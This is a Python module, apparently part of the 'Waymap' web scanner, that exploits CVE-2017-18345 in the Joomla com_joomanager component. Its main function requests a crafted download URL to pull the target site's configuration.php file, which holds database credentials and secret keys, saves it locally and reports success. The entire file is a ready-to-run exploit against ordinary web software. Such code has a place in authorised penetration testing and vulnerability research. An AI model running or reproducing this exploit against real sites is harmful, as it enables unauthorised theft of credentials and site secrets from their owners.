# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2017-18345

import urllib2
from bs4 import BeautifulSoup
import urlparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TerminalColors:
    red = '\033[31m'
    green = '\033[32m'
    blue = '\033[34m'
    cyan = '\033[36m'
    purple = '\033[35m'
    yellow = '\033[33m'
    white = '\033[37m'
    default = '\033[0m'

def exploit_cve_2017_18345(target):
    try:
        download_path = "index.php?option=com_joomanager&controller=details&task=download&path=configuration.php"
        full_url = target + download_path

        try:
            base_url = urlparse.urlparse(target).path
            clean_url = target.replace(base_url, "")
            response = requests.get(clean_url, verify=False)
        except:
            response = requests.get(target, verify=False)

        file_response = urllib2.urlopen(full_url)
        soup = BeautifulSoup(response.content.decode('utf-8', 'ignore'), 'html.parser')
        page_title = soup.title.text

        with open(page_title + ".php", "wb") as file:
            file.write(file_response.read())

        print(TerminalColors.green + "[*] Exploit Successful:")
        print(TerminalColors.cyan + "[*] Target: " + clean_url)
        print(TerminalColors.cyan + "[*] Page Title: " + page_title)
        print(TerminalColors.yellow + "[*] File Saved as: " + page_title + ".php")
        print(TerminalColors.cyan + "[*] Exploit Path: " + download_path)

    except Exception as e:
        print(TerminalColors.red + "[!] Exploit failed for target: " + target)
        print(TerminalColors.red + "Error: " + str(e))

def scan_cve_2017_18345(target):

    print(TerminalColors.green + "[*] Starting Exploit..." + TerminalColors.default)
    exploit_cve_2017_18345(target)
    print(TerminalColors.green + "[*] Exploit Complete" + TerminalColors.default)



